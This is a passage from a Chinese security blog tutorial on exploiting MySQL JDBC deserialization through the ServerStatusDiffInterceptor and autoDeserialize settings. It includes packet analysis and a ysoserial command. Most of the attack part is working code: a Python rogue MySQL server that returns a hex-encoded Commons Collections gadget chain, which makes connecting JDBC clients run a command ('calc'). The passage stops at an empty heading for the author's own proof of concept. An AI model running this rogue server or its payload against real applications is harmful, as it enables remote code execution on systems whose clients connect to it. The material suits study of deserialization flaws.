<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748532421634-7a447947-f279-48f6-9428-d6e60ae2075d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748532421634-7a447947-f279-48f6-9428-d6e60ae2075d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><code>ResultSetUtil</code>这个类是用来处理一些测试用例的结果，或者是profiler的结果。简而言之就是用来数据处理的类，我们继续往上看，谁调用了这里</p>
<p>我们在<code>ServerStatusDiffInterceptor</code>类的<code>populateMapWithSessionStatusValues</code>方法调用了<code>ResultSetUtil#resultSetToMap</code></p>
<p>这里看一下<code>populateMapWithSessionStatusValues</code>方法的代码逻辑，首先建立了JDBC的连接，并创建查询<code>SHOW SESSION STATUS</code>，接着调用<code>ResultSetUtil#resultSetToMap</code>，完成查询并封装查询结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748532800206-c09d921d-1c5b-49ed-836e-c55b886e9058.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748532800206-c09d921d-1c5b-49ed-836e-c55b886e9058.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们这里向上查找调用，找到了两个地方：<code>ServerStatusDiffInterceptor#postProcess</code>和<code>ServerStatusDiffInterceptor#preProcess</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748532901307-dfb61a16-6724-4b21-b4d9-9179865416c8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748532901307-dfb61a16-6724-4b21-b4d9-9179865416c8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><code>ServerStatusDiffInterceptor</code>是一个拦截器，在JDBC URL中设定属性<code>queryInterceptors</code>为<code>ServerStatusDiffInterceptor</code>时，执行查询语句会调用拦截器的preProcess和postProcess方法，这是一个自动化执行的过程，可以利用它作为利用链的头部</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748533172174-55e5ff2d-87bf-4e07-bcc6-06f72bd520eb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748533172174-55e5ff2d-87bf-4e07-bcc6-06f72bd520eb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="O95Xj">数据包分析</h3>

<p>我们现构造一个JDBC的客户端，代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbc_url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/jdbc?characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&amp;autoDeserialize=true&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(jdbc_url, <span class="string">&quot;jdbc&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在本地开一个mysql服务，配置数据库信息后运行，使用wireshark进行抓包，并使用以下过滤语句过滤3306端口的mysql协议（这里实际使用不同IP进行实验更好）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">tcp.port == <span class="number">3306</span> &amp;&amp; mysql</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748655575195-1b4ff73a-6d5f-4510-8ed1-3e6ccbe92284.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748655575195-1b4ff73a-6d5f-4510-8ed1-3e6ccbe92284.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里我们需要构造的是greeting、Response OK和Response数据包，这些数据包都可以直接照抄，按流量包将<code>MySQL Protocol</code>中的数据直接返回到客户端，但除了<code>SHOW SESSION STATUS</code>的返回包需要我们自己构造，其中我们的序列化数据就存储在其中</p>
<p>如下图，这个是一个Response OK的数据包，我们选中MySQL Protocol部分，他的数据流为<code>0700000200000002000000</code>，因此我们发送数据时只需要发送<code>0700000200000002000000</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748655847540-b0137bca-06eb-4cd7-83ed-d1f830713575.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748655847540-b0137bca-06eb-4cd7-83ed-d1f830713575.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="sdqty">fakeMySQL构造</h3>
<h4 id="XOKpj">部分代码构造</h4>

<p>除去<code>SHOW SESSION STATUS</code>的返回包以外，其他数据包构造的如下代码所示，可以先将其他部分的数据包构造搞清楚后，再进行<code>SHOW SESSION STATUS</code>数据包的构造</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">greeting = <span class="string">&quot;4a0000000a352e372e323600130000005623364e2121182c00fff7c00200ff811500000000000000000000594b096a7d56547301550952006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">responseOK = <span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn, data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiving the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        send_data(conn, greeting)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn, responseOK)</span><br><span class="line"></span><br><span class="line">            data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&quot;01000001142e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f73697a65000c3f001500000008a00000000026000010036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000011036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000012036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000013036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001403646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000015036465660000000c776169745f74696d656f7574000c3f001500000008a00000000019010016013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c01310831363737373231360236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000017fe000002000200&quot;</span></span><br><span class="line">                send_data(conn,payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&quot;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&quot;</span></span><br><span class="line">                send_data(conn,payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, responseOK)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, responseOK)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;@@session.autocommit&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span></span><br><span class="line">                send_data(conn,payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;SHOW SESSION STATUS&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line">    <span class="comment">#建立一个ipv4，TCP的socket连接</span></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#绑定IP与端口</span></span><br><span class="line">    sk.bind((HOST,PORT))</span><br><span class="line">    <span class="comment">#建立监听</span></span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST, PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="tFeNo">SHOW SESSION STATUS响应包编写</h4>

<p>想要自行去编写该响应包，需要对MySQL的私有协议有一些了解</p>
<p>从流量中看，<code>SHOW SESSION STATUS</code>属于request query报文，对于查询数据包的响应包分为以下四种：</p>
<ol>
<li>错误包（ERR Packet）</li>
<li>正确包（OK Packet）</li>
<li>Protocol::LOCAL_INFILE_Request</li>
<li>结果集（ProtocolText::Resultset）</li>
</ol>
<p>在这一部分中，我们返回的是结果集这类型的响应包，该类响应包结构如下图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748657111930-8a2300e1-0dfe-4eaa-8024-963b914fdb62.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748657111930-8a2300e1-0dfe-4eaa-8024-963b914fdb62.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>结果集结构可以说分为五个数据段</p>
<ul>
<li>数据段1：说明下面的结果集有多少列</li>
<li>数据段2：列的定义</li>
<li>数据段3：EOF包</li>
<li>数据段4：行数据</li>
<li>数据段5：EOF包</li>
</ul>
<p>数据段的结构也是相似的。 长度（3字节） 序号（1字节） 协议数据（不同协议，数据不同）</p>
<ol>
<li>数据段1就可以写成<code>01 00 00 01 02</code>，前三字节表示数据长度为1，sequence id为1，最后一字节02表示有两列（这里说写成一列的化无法正常运行）</li>
<li>数据段2的定义比较复杂，我们直接那完整的数据进行分析</li>
</ol>
<p><code>1a000002036465660001630163016301630c3f00ffff0000fcffff000000</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1a 00 00  //3字节表示长度（这个长度说的是协议的内容长度，不包括序号那一字节）</span><br><span class="line">02      //序号 因为是第二个数据字段</span><br><span class="line">03646566  // 这个就是def的意思。</span><br><span class="line">00   //schema 协议因为不使用就用00</span><br><span class="line">01 63  //table 因为我们使用列数据，就不需要名字了，下面几个都是任意字符。字符串第一字节是用来说明长度的。</span><br><span class="line">01 63  //org_table  01表示1字节，63是数据</span><br><span class="line">0163    //name  </span><br><span class="line">0163   //org_name</span><br><span class="line">0c      filler  // length of the following fields 总是0x0c</span><br><span class="line">3f00   //characterset  字符编码 003f是binary </span><br><span class="line">ffff0000  column_length //允许数据最大长度，就是我们行数据的最大长度。ffff</span><br><span class="line">fc    //column_type 这一列数据类型  fc表示blob  </span><br><span class="line">9000    //flags  9000用的官方的 poc可以运行。  看fnmsd的要大于128好像。</span><br><span class="line">00          //decimals</span><br><span class="line">0000        //filler_2</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>我见过的POC中都没有添加EOF包，不知道为什么加上就无法复现成功</li>
<li>数据段4就是POC了，POC其实和上面一样的。计算出长度（3字节）序号（1字节）行数据（行数据第一个字节是数据的长度）</li>
<li>最后加入一个EOF包</li>
</ol>
<p>这里我们使用ysoserial生成CC的POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial [CCn] &quot;calc&quot; &gt; payload</span><br></pre></td></tr></table></figure>

<h4 id="c1oom">最终POC</h4>

<p>大佬们的POC中，<code>show warnings</code>的返回包构造出现了两次，一次是在<code>session.auto_increment_increment</code>的else if后，一次是在<code>SHOW SESSION STATUS</code>的后面</p>
<p>尝试了一下，在<code>SHOW SESSION STATUS</code>的后面，会继续发送一个<code>show warnings</code>的request query包，只有当返回该包的响应包，才能执行反序列化操作</p>
<blockquote>
<p>前面的<code>else if (show warnings)</code>我没加，但是可以成功执行，求大佬们解答一下前面的else if判断是有哪种特殊情况吗</p>
</blockquote>
<h5 id="Xcnq1">大佬们的POC</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  &quot;calc&quot; &gt; a </span></span><br><span class="line">    file= <span class="string">r&#x27;a&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment">#获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment">#计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment">#计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3309</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>

<h5 id="qDAIF">自写POC</h5>

